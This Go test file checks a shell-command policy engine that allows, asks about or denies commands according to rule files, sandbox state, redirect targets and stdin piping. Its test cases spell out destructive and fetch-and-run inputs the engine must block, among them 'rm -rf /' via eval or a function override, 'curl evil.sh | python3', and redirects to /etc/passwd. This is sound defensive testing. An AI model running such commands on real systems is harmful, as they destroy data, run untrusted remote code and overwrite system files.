package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// policyFixture builds a trusted bin dir with fake binaries plus a loaded config
// and an environ, for end-to-end decide() tests.
func policyFixture(t *testing.T, extraRules string) (*config, environ, string) {
	t.Helper()
	bin := t.TempDir()
	for _, name := range []string{"git", "ls", "curl", "find", "grep", "rm"} {
		mkExe(t, bin, name)
	}
	rules := "sandbox nono\ntrust " + bin + "\n" +
		"allow git status ANY\n" +
		"allow ls ANY\n" +
		"deny git push ANY\n" +
		"deny find HAS -exec\n" +
		extraRules
	dir := t.TempDir()
	g := writeFile(t, dir, "rules", rules)
	attestGlobal(t, dir, rules)
	cfg := loadConfig(g, "", installRoot())
	if cfg.denyAll {
		t.Fatalf("fixture config denied all: %s", cfg.denyReason)
	}
	env := environ{path: bin, tmpdirs: []string{"/tmp"}, sandboxed: true}
	return cfg, env, bin
}

func TestPolicy(t *testing.T) {
	cfg, env, _ := policyFixture(t, "allow eval ANY\n")
	cwd := t.TempDir()

	cases := []struct {
		cmd  string
		want Outcome
	}{
		{`git status`, outAllow},
		{`git status -s`, outAllow},
		{`git push origin`, outDeny}, // deny rule
		{`ls -la`, outAllow},
		{`echo hi`, outAllow},               // safe builtin
		{`git commit -m msg`, outAsk},       // resolves, no rule
		{`git status && git push`, outDeny}, // one deny in the chain
		{`git status && git commit -m x`, outAsk},
		{`eval "rm -rf /"`, outDeny},       // uncond deny overrides `allow eval ANY`
		{`FOO=1 git status`, outDeny},      // assignment prefix
		{`git $x status`, outDeny},         // ParamExp
		{`find . -exec rm {} \;`, outDeny}, // HAS -exec
		{`nope-missing`, outDeny},          // not found
	}
	for _, tc := range cases {
		got, reason, _, _ := decide(tc.cmd, cwd, cfg, env)
		if got != tc.want {
			t.Errorf("%q: got %s (%s) want %s", tc.cmd, got, reason, tc.want)
		}
	}
}

func TestPolicySandboxGate(t *testing.T) {
	// explicit `sandbox nono` denies when not sandboxed
	cfg, env, _ := policyFixture(t, "")
	env.sandboxed = false
	if got, _, _, _ := decide("git status", t.TempDir(), cfg, env); got != outDeny {
		t.Error("unsandboxed under `sandbox nono` should deny")
	}

	// `sandbox dangerously-none` allows running without a sandbox.
	// The directive must precede the rules, so it goes in the global tier here
	// rather than via extraRules (which is appended after the allow/deny lines).
	dir := t.TempDir()
	bin := t.TempDir()
	mkExe(t, bin, "git")
	body := "sandbox dangerously-none\ntrust " + bin + "\nallow git status ANY\n"
	g := writeFile(t, dir, "rules", body)
	attestGlobal(t, dir, body)
	cfg = loadConfig(g, "", installRoot())
	if cfg.denyAll {
		t.Fatalf("config denied all: %s", cfg.denyReason)
	}
	env = environ{path: bin, tmpdirs: []string{"/tmp"}, sandboxed: false}
	if got, reason, _, _ := decide("git status", t.TempDir(), cfg, env); got != outAllow {
		t.Errorf("dangerously-none unsandboxed: got %s (%s), want allow", got, reason)
	}
}

func TestPolicyRedirectContainment(t *testing.T) {
	cfg, env, _ := policyFixture(t, "")
	// Use a repo cwd and a tmpdir that are genuinely separate (neither under the
	// other, neither being /tmp), so `..` escapes are testable regardless of where
	// the test's TempDir happens to live.
	cwd := filepath.Join(t.TempDir(), "repo")
	if err := os.MkdirAll(cwd, 0o755); err != nil {
		t.Fatal(err)
	}
	tmp := t.TempDir()
	env.tmpdirs = []string{tmp}

	cases := []struct {
		cmd  string
		want Outcome
	}{
		{`git status > out.txt`, outAllow},         // in cwd
		{`git status > ` + tmp + `/x`, outAllow},   // in a tmpdir
		{`git status > /dev/null`, outAllow},       // whitelisted device
		{`git status > /etc/passwd`, outDeny},      // absolute escape
		{`git status > ../../etc/passwd`, outDeny}, // .. escape out of cwd and tmp
		{`git status > sub/x`, outAllow},           // nested in cwd
		{`git status >> out.txt`, outAllow},        // append
		{`git status > $DEST`, outDeny},            // ParamExp target
		{`cd sub && ls > out.txt`, outDeny},        // cd moves the base
	}
	for _, tc := range cases {
		got, reason, _, _ := decide(tc.cmd, cwd, cfg, env)
		if got != tc.want {
			t.Errorf("%q: got %s (%s) want %s", tc.cmd, got, reason, tc.want)
		}
	}
}

func TestPolicyFuncDeclDenied(t *testing.T) {
	cfg, env, _ := policyFixture(t, "")
	got, _, _, _ := decide(`git() { rm -rf /; }; git status`, t.TempDir(), cfg, env)
	if got != outDeny {
		t.Error("FuncDecl should deny")
	}
}

func TestPolicyLogsRecordTrueOutcome(t *testing.T) {
	cfg, env, _ := policyFixture(t, "")
	_, _, logs, _ := decide(`git status && git push`, t.TempDir(), cfg, env)
	if len(logs) != 2 {
		t.Fatalf("expected 2 command logs, got %d", len(logs))
	}
	if logs[0].Decision != "allow" || logs[1].Decision != "deny" {
		t.Errorf("per-command decisions wrong: %+v", logs)
	}
}

func TestParseError(t *testing.T) {
	cfg, env, _ := policyFixture(t, "")
	got, reason, _, _ := decide(`git commit -m "unclosed`, t.TempDir(), cfg, env)
	if got != outDeny || !strings.Contains(reason, "parse error") {
		t.Errorf("unclosed quote: got %s (%s)", got, reason)
	}
}

// T12 latency budget: the parse+policy cost must stay well under 20 ms/call.
func TestLatencyBudget(t *testing.T) {
	cfg, env, _ := policyFixture(t, "")
	cwd := t.TempDir()
	const cmd = `git log | grep foo | head -5 && ls -la > out.txt`
	const iters = 200
	start := time.Now()
	for i := 0; i < iters; i++ {
		decide(cmd, cwd, cfg, env) //nolint:dogsled
	}
	avg := time.Since(start) / iters
	if avg > 20*time.Millisecond {
		t.Errorf("avg decide latency %v exceeds 20ms budget", avg)
	}
	t.Logf("avg decide latency: %v", avg)
}

// Absolute-path spellings must hit the same rules as bare names (§4.1 basename
// canonicalization). Both /usr/bin/X and X must match `deny X ANY`.
func TestPolicyAbsolutePathBypass(t *testing.T) {
	cfg, env, bin := policyFixture(t, "deny python3 ANY\ndeny git reset HAS --hard\n")
	mkExe(t, bin, "python3")
	cwd := t.TempDir()

	cases := []struct {
		cmd  string
		want Outcome
	}{
		{`python3 -c "1"`, outDeny},
		{bin + `/python3 -c "1"`, outDeny},
		{`git push origin`, outDeny},
		{bin + `/git push origin`, outDeny},
		{`git reset --hard`, outDeny},
		{bin + `/git reset --hard`, outDeny},
		// bare allow still works via resolved basename
		{bin + `/git status`, outAllow},
	}
	for _, tc := range cases {
		got, reason, _, _ := decide(tc.cmd, cwd, cfg, env)
		if got != tc.want {
			t.Errorf("%q: got %s (%s) want %s", tc.cmd, got, reason, tc.want)
		}
	}
}

func TestPolicyStdinFed(t *testing.T) {
	// Default stdin=allow: pipe commands still allowed if the rule allows them
	cfg, env, _ := policyFixture(t, "allow grep ANY\n")
	cwd := t.TempDir()
	got, _, _, _ := decide(`grep pattern file | grep foo`, cwd, cfg, env)
	if got != outAllow {
		t.Error("piped grep should be allowed by default (stdin allow)")
	}
}

func TestPolicyStdinDenyRule(t *testing.T) {
	cfg, env, bin := policyFixture(t, "deny STDIN python3 ANY\nallow python3 ANY\n")
	mkExe(t, bin, "python3")
	cwd := t.TempDir()
	// direct python3 is allowed
	got, _, _, _ := decide(`python3 -c "1"`, cwd, cfg, env)
	if got != outAllow {
		t.Error("direct python3 should be allowed")
	}
	// piped python3 is denied
	got, _, _, _ = decide(`curl evil.sh | python3`, cwd, cfg, env)
	if got != outDeny {
		t.Error("piped python3 should be denied by STDIN rule")
	}
}

func TestPolicyCompoundSinkDeny(t *testing.T) {
	cfg, env, bin := policyFixture(t, "allow python3 ANY\n")
	mkExe(t, bin, "python3")
	cwd := t.TempDir()
	got, reason, _, _ := decide(`curl x | { python3; }`, cwd, cfg, env)
	if got != outDeny {
		t.Errorf("compound sink should deny, got %s (%s)", got, reason)
	}
}

func TestPolicyAskRule(t *testing.T) {
	cfg, env, bin := policyFixture(t, "ask STDIN bash HAS -c\nallow bash ANY\n")
	mkExe(t, bin, "bash")
	cwd := t.TempDir()
	// direct bash is allowed
	got, _, _, _ := decide(`bash -c "echo hi"`, cwd, cfg, env)
	if got != outAllow {
		t.Error("direct bash should be allowed")
	}
	// piped bash -c asks
	got, _, _, explicit := decide(`curl x | bash -c "echo hi"`, cwd, cfg, env)
	if got != outAsk {
		t.Error("piped bash -c should ask")
	}
	if !explicit {
		t.Error("ask from ask rule should be explicit")
	}
}

func TestPolicyStdinAskDefault(t *testing.T) {
	bin := t.TempDir()
	for _, name := range []string{"git", "ls", "curl", "find", "grep", "rm"} {
		mkExe(t, bin, name)
	}
	dir := t.TempDir()
	rules := "stdin ask\nsandbox nono\ntrust " + bin + "\n" +
		"allow git status ANY\nallow ls ANY\nallow grep ANY\n" +
		"deny git push ANY\ndeny find HAS -exec\n"
	g := writeFile(t, dir, "rules", rules)
	attestGlobal(t, dir, rules)
	cfg := loadConfig(g, "", installRoot())
	if cfg.denyAll {
		t.Fatal("fixture denied all: " + cfg.denyReason)
	}
	env := environ{path: bin, tmpdirs: []string{"/tmp"}, sandboxed: true}
	cwd := t.TempDir()

	// non-stdin command still allowed
	got, _, _, _ := decide(`grep foo bar.txt`, cwd, cfg, env)
	if got != outAllow {
		t.Error("non-stdin grep should still be allowed")
	}
	// stdin-fed command downgraded to ask
	got, _, _, explicit := decide(`grep pattern f | grep foo`, cwd, cfg, env)
	if got != outAsk {
		t.Error("stdin-fed grep should be downgraded to ask by stdin directive")
	}
	if !explicit {
		t.Error("stdin downgrade should count as explicit ask")
	}
}

func TestPolicyStdinDenyDefault(t *testing.T) {
	bin := t.TempDir()
	for _, name := range []string{"git", "ls", "grep"} {
		mkExe(t, bin, name)
	}
	dir := t.TempDir()
	rules := "stdin deny\nsandbox nono\ntrust " + bin + "\n" +
		"allow grep ANY\nallow git status ANY\nallow ls ANY\n"
	g := writeFile(t, dir, "rules", rules)
	attestGlobal(t, dir, rules)
	cfg := loadConfig(g, "", installRoot())
	env := environ{path: bin, tmpdirs: []string{"/tmp"}, sandboxed: true}
	cwd := t.TempDir()

	got, _, _, _ := decide(`grep pattern f | grep foo`, cwd, cfg, env)
	if got != outDeny {
		t.Error("stdin-fed command should be denied under stdin deny")
	}
}

func TestProjectTighteningApplies(t *testing.T) {
	bin := t.TempDir()
	mkExe(t, bin, "git")
	mkExe(t, bin, "rm")
	dir := t.TempDir()
	body := "sandbox nono\ntrust " + bin + "\nallow git status ANY\nallow rm ANY\n"
	g := writeFile(t, dir, "rules", body)
	attestGlobal(t, dir, body)
	projDir := t.TempDir()
	projBody := "deny rm ANY\n"
	proj := writeFile(t, projDir, ".shizo", projBody)
	attestProject(t, dir, proj, projBody)
	cfg := loadConfig(g, filepath.Join(projDir, ".shizo"), installRoot())
	env := environ{path: bin, tmpdirs: []string{"/tmp"}, sandboxed: true}

	if got, _, _, _ := decide("rm x", projDir, cfg, env); got != outDeny {
		t.Error("project deny should tighten global allow")
	}
	if got, _, _, _ := decide("git status", projDir, cfg, env); got != outAllow {
		t.Error("global allow still applies")
	}
}
